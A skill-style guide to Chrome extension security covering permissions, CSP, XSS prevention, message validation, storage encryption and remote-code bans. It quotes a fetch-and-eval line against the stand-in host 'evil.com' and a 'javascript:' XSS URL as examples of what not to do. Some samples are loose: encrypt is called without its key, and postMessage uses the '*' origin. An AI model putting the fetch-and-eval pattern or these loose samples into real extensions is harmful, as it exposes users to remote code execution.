---
name: security-best-practices
description: Security best practices for Chrome Extensions covering principle of least privilege, CSP configuration, XSS prevention, secure messaging, safe DOM manipulation, data protection, and permission strategies. Essential for building secure extensions.
---

# Chrome Extension Security Best Practices

## Principle of Least Privilege

### Permission Strategy

**Request minimum permissions:**
```json
{
  "permissions": [
    "storage",      // Only what you need
    "activeTab"     // Prefer over "tabs" when possible
  ],
  "optional_permissions": [
    "history",      // Request when needed
    "bookmarks"
  ],
  "host_permissions": [
    "*://*.specific-domain.com/*"  // Scope narrowly
  ]
}
```

**Permission Comparison:**

| Permission | Access Level | When to Use |
|------------|--------------|-------------|
| `activeTab` | Current tab on click | Prefer when possible |
| `tabs` | All tab URLs/titles | Only if listing tabs |
| `<all_urls>` | All websites | Rarely justified |
| `host_permissions` | Specific domains | Scope as narrowly as possible |

### activeTab vs tabs

```javascript
// activeTab - only works after user gesture
// Access granted only for current tab, only during action

// tabs - always has access
// Can see URLs of all tabs
const tabs = await chrome.tabs.query({});
tabs.forEach(t => console.log(t.url)); // Privacy concern!
```

### Optional Permissions

```javascript
// Request only when needed
async function enableAdvancedFeature() {
  const granted = await chrome.permissions.request({
    permissions: ['history'],
    origins: ['*://*.example.com/*']
  });

  if (granted) {
    // Enable feature
  } else {
    // Show explanation, offer alternative
  }
}

// Remove when no longer needed
await chrome.permissions.remove({
  permissions: ['history']
});
```

---

## Content Security Policy (CSP)

### Manifest V3 CSP

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'",
    "sandbox": "sandbox allow-scripts; script-src 'self' 'unsafe-eval'"
  }
}
```

### CSP Restrictions in MV3

**NOT ALLOWED:**
- `unsafe-eval` (except in sandbox)
- `unsafe-inline`
- Remote code execution
- External script sources

**ALLOWED:**
- `'self'` - Extension's own scripts
- `'wasm-unsafe-eval'` - WebAssembly
- Specific extension URLs

### Working Within CSP

```javascript
// WRONG - Blocked by CSP
eval('console.log("hello")');
new Function('return 1 + 1');

// WRONG - Inline scripts blocked
// <script>alert('hello')</script>

// CORRECT - External script file
// <script src="script.js"></script>

// For dynamic code needs, use sandbox
// Create sandboxed iframe, communicate via postMessage
```

### Sandbox for Dynamic Code

```json
{
  "sandbox": {
    "pages": ["sandbox.html"]
  }
}
```

```javascript
// sandbox.html can use eval
// Communicate via postMessage
// Main extension → sandbox
frame.contentWindow.postMessage({ code: '1 + 1' }, '*');

// sandbox → main extension
parent.postMessage({ result: eval(code) }, '*');
```

---

## XSS Prevention

### DOM Manipulation

```javascript
// DANGEROUS - XSS vulnerability
element.innerHTML = userInput;
document.write(userInput);

// SAFE - Text content only
element.textContent = userInput;

// SAFE - Attribute setting
element.setAttribute('title', userInput);
// But NOT: element.setAttribute('href', 'javascript:' + userInput);

// SAFE - DOM creation
const div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);
```

### If HTML is Required

```javascript
// Use a sanitizer library
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
element.innerHTML = clean;

// Or use template literals carefully
function createItem(title, description) {
  const item = document.createElement('div');
  item.className = 'item';

  const titleEl = document.createElement('h3');
  titleEl.textContent = title;  // Safe

  const descEl = document.createElement('p');
  descEl.textContent = description;  // Safe

  item.appendChild(titleEl);
  item.appendChild(descEl);
  return item;
}
```

### URL Validation

```javascript
// DANGEROUS - XSS via javascript: URLs
const url = userInput;
element.href = url; // If url is "javascript:alert(1)"

// SAFE - Validate URL protocol
function isValidUrl(string) {
  try {
    const url = new URL(string);
    return url.protocol === 'http:' || url.protocol === 'https:';
  } catch {
    return false;
  }
}

if (isValidUrl(userInput)) {
  element.href = userInput;
}
```

---

## Secure Message Passing

### Validate Message Sources

```javascript
// background.js
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Verify sender is from this extension
  if (sender.id !== chrome.runtime.id) {
    console.warn('Message from unknown source');
    return;
  }

  // Verify expected origin for content scripts
  if (sender.tab) {
    const allowedOrigins = ['https://example.com', 'https://app.example.com'];
    const origin = new URL(sender.url).origin;
    if (!allowedOrigins.includes(origin)) {
      console.warn('Message from unexpected origin:', origin);
      return;
    }
  }

  // Process message
});
```

### Validate Message Content

```javascript
// Define expected message schema
const messageSchemas = {
  SAVE_DATA: {
    type: 'object',
    required: ['url', 'title'],
    properties: {
      url: { type: 'string', pattern: '^https?://' },
      title: { type: 'string', maxLength: 500 }
    }
  }
};

function validateMessage(message) {
  const schema = messageSchemas[message.type];
  if (!schema) {
    return false;
  }

  // Validate against schema
  // Use a validation library like ajv in production
  return isValidAgainstSchema(message.data, schema);
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (!validateMessage(message)) {
    sendResponse({ error: 'Invalid message format' });
    return;
  }
  // Process valid message
});
```

### External Message Security

```json
{
  "externally_connectable": {
    "matches": [
      "https://yourdomain.com/*"
    ]
  }
}
```

```javascript
// Only specific domains can send messages
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  // sender.url is verified by Chrome against externally_connectable
  // Still validate message content
  if (!isValidExternalMessage(message)) {
    sendResponse({ error: 'Invalid' });
    return;
  }
});
```

---

## Secure Storage

### Sensitive Data

```javascript
// DON'T store in plain text
await chrome.storage.local.set({
  apiKey: 'sk-1234567890'  // BAD!
});

// DO encrypt sensitive data
async function encryptAndStore(key, value) {
  const encrypted = await encrypt(value);  // Use Web Crypto API
  await chrome.storage.local.set({ [key]: encrypted });
}

// Or better: Don't store sensitive data at all
// Use OAuth tokens that can be revoked
// Use session storage for temporary auth
```

### Web Crypto API

```javascript
async function generateKey() {
  return await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,
    ['encrypt', 'decrypt']
  );
}

async function encrypt(data, key) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encoded = new TextEncoder().encode(JSON.stringify(data));

  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoded
  );

  return {
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted))
  };
}

async function decrypt(encrypted, key) {
  const decrypted = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: new Uint8Array(encrypted.iv) },
    key,
    new Uint8Array(encrypted.data)
  );

  return JSON.parse(new TextDecoder().decode(decrypted));
}
```

---

## Network Security

### HTTPS Only

```javascript
// Always use HTTPS
const API_URL = 'https://api.example.com';  // Never http://

// Validate URLs before fetching
function isSecureUrl(url) {
  try {
    return new URL(url).protocol === 'https:';
  } catch {
    return false;
  }
}

async function secureFetch(url, options = {}) {
  if (!isSecureUrl(url)) {
    throw new Error('Only HTTPS URLs allowed');
  }
  return fetch(url, options);
}
```

### API Key Protection

```javascript
// DON'T include API keys in client code
const response = await fetch(`https://api.com?key=${API_KEY}`);  // Exposed!

// DO use a backend proxy
const response = await fetch('https://your-backend.com/api/proxy', {
  method: 'POST',
  body: JSON.stringify({ action: 'getData' })
});
// Backend adds API key server-side
```

---

## Content Script Security

### Isolated World

```javascript
// Content scripts run in isolated world by default
// Cannot access page's JavaScript variables

// If you need page context:
{
  "content_scripts": [{
    "world": "MAIN",  // Runs in page context - DANGEROUS
    "matches": ["*://*.trusted-domain.com/*"],
    "js": ["page-script.js"]
  }]
}

// Better: Inject script element
const script = document.createElement('script');
script.src = chrome.runtime.getURL('inject.js');
document.documentElement.appendChild(script);
script.onload = () => script.remove();
```

### Safe DOM Interaction

```javascript
// DANGEROUS - Page might override
document.querySelector('#submit').click();

// SAFER - Use methods directly
const button = document.querySelector('#submit');
HTMLElement.prototype.click.call(button);

// Or dispatch events
button.dispatchEvent(new MouseEvent('click', { bubbles: true }));
```

---

## Code Injection Prevention

### No Remote Code

```javascript
// FORBIDDEN in MV3
// Cannot fetch and execute remote scripts
const code = await fetch('https://evil.com/script.js');
eval(code);  // Blocked by CSP

// Cannot include remote scripts in HTML
// <script src="https://remote.com/script.js"></script>  // Blocked

// ALLOWED
// Bundle all code in extension
// Use static imports
import { helper } from './helper.js';
```

### Dynamic Script Injection

```javascript
// If you must inject code dynamically
// Use chrome.scripting with bundled files

await chrome.scripting.executeScript({
  target: { tabId },
  files: ['bundled-script.js']  // Must be in extension
});

// For dynamic behavior, pass data
await chrome.scripting.executeScript({
  target: { tabId },
  func: (config) => {
    // config is data, not code
    console.log(config.message);
  },
  args: [{ message: 'Hello' }]
});
```

---

## Security Checklist

### Permissions
- [ ] Using minimum required permissions
- [ ] activeTab instead of tabs where possible
- [ ] Scoped host_permissions
- [ ] Optional permissions for non-essential features

### CSP
- [ ] No unsafe-eval (except sandbox)
- [ ] No inline scripts
- [ ] No remote code loading
- [ ] Sandbox for dynamic code needs

### XSS Prevention
- [ ] Using textContent for user input
- [ ] Sanitizing any HTML input
- [ ] Validating URLs before use
- [ ] No innerHTML with untrusted data

### Messaging
- [ ] Validating sender.id
- [ ] Validating message content
- [ ] Proper externally_connectable config
- [ ] No sensitive data in messages

### Storage
- [ ] Encrypting sensitive data
- [ ] Not storing API keys client-side
- [ ] Using session storage for temporary data
- [ ] Proper storage quota management

### Network
- [ ] HTTPS only
- [ ] API keys server-side
- [ ] Input validation before API calls
- [ ] Error handling without data leakage

### Content Scripts
- [ ] Isolated world by default
- [ ] Safe DOM manipulation
- [ ] No eval or Function constructor
- [ ] Proper event delegation

---

## Common Vulnerabilities

| Vulnerability | Risk | Prevention |
|--------------|------|------------|
| XSS | Code execution | Use textContent, sanitize HTML |
| CSRF | Unauthorized actions | Validate message sources |
| Data leakage | Privacy breach | Encrypt storage, HTTPS only |
| Over-privileged | Attack surface | Minimum permissions |
| Code injection | Full compromise | No eval, no remote code |
| Clickjacking | UI manipulation | Frame-busting, CSP |
